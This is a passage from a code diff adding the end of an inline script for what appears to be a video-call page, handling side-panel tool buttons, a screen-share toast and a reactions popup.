+    (function (btn) {
+      btn.addEventListener('click', function () {
+        var name = btn.getAttribute('data-panel');
+
+        if (name === 'Share') {
+          showToast('Starting screen share…');
+          return;
+        }
+        if (!sidePanel || !panelTitle || !panelBody) return;
+
+        var tools = document.querySelectorAll('.tool');
+        for (var j = 0; j < tools.length; j++) tools[j].classList.remove('active');
+        btn.classList.add('active');
+
+        panelTitle.textContent = name;
+        panelBody.innerHTML = panelContent[name] || '<div class="empty-state">' + name + '</div>';
+        sidePanel.classList.add('open');
+        sidePanel.setAttribute('aria-hidden', 'false');
+      });
+    })(panelButtons[i]);
+  }
+
+  /* ---------- Reactions popup ---------- */
+  var reactBtn = document.getElementById('reactBtn');
+  var reactionsPopup = document.getElementById('reactionsPopup');
+
+  if (reactBtn && reactionsPopup) {
+    reactBtn.addEventListener('click', function (e) {
+      e.stopPropagation();
+      var open = reactionsPopup.classList.toggle('open');
+      reactBtn.classList.toggle('active', open);
+    });
+
+    var reactions = reactionsPopup.querySelectorAll('.reaction');
+    for (var k = 0; k < reactions.length; k++) {
+      (function (r) {
+        r.addEventListener('click', function () {
+          reactionsPopup.classList.remove('open');
+          reactBtn.classList.remove('active');
+          showToast('Reacted ' + r.textContent);
+        });
+      })(reactions[k]);
+    }
+
+    document.addEventListener('click', function (e) {
+      if (!reactionsPopup.contains(e.target) && !reactBtn.contains(e.target)) {
+        reactionsPopup.classList.remove('open');
+        reactBtn.classList.remove('active');
+      }
+    });
+  }
+})();
+</script>
+
+</body>
+</html>
